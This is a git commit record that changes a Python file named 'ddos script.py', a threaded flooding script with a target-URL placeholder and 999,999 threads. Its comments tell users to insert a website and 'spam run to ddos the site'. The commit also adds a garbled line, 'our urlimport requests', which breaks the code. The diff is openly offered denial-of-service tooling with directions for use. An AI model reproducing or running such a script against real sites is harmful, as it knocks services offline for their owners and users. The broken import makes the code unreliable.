9e86d58050ef434c8d884a1234d9f58b0fb9f744
al.btc <139679621+arbtc@users.noreply.github.com>
2023-08-22 20:22:57 +0200

    Update ddos script.py
    just a small change

--- ddos script.py
+++ ddos script.py
@@ -1,4 +1,4 @@
-import requests
+our urlimport requests
 import threading
 
 def ddos_site(url):
@@ -9,7 +9,7 @@ def ddos_site(url):
             pass
 
 if __name__ == "__main__":
-    target_url = "your website" # IMPORTANT Where it says your website put your website and dont forget to add https:// or http:// and put it between the quotation marks also remove this text im writing when you run the code run the code in Visual Studio Code you can also choose your amount of num threads just dont put a numbber that will make your pc explode lol when you are gonna run the code just spam run to ddos the site
+    target_url = "your website" # IMPORTANT Where it says your website put your website and dont forget to add https:// or http:// before your url and put it between the quotation marks also remove this text im writing when you run the code run the code in Visual Studio Code you can also choose your amount of num threads just dont put a numbber that will make your pc explode lol when you are gonna run the code just spam run to ddos the site
      
     num_threads = 999999
 
